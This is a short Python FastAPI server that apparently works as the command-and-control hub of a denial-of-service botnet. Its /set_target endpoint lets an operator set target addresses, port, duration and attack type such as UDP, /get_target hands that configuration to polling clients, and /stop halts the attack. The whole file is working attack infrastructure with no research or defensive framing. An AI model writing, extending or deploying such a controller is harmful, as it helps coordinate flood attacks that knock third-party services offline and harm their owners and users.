from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import uvicorn

app = FastAPI()

attack_config = {
    "targets": ["127.0.0.1"],
    "port": 80,
    "duration": 1,
    "type": "UDP",
    "enabled": False
}

@app.get("/get_target")
async def get_target():
    return attack_config if attack_config["enabled"] else {"enabled": False}

@app.post("/set_target")
async def set_target(request: Request):
    data = await request.json()
    try:
        attack_config["targets"] = data["targets"]
        attack_config["port"] = int(data["port"])
        attack_config["duration"] = int(data["duration"])
        attack_config["type"] = data["type"]
        attack_config["enabled"] = True
        return JSONResponse(content={"status": "success", "message": "Target set."})
    except Exception as e:
        return JSONResponse(status_code=400, content={"status": "error", "message": str(e)})

@app.post("/stop")
async def stop_attack():
    attack_config["enabled"] = False
    return {"status": "stopped"}

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=10000)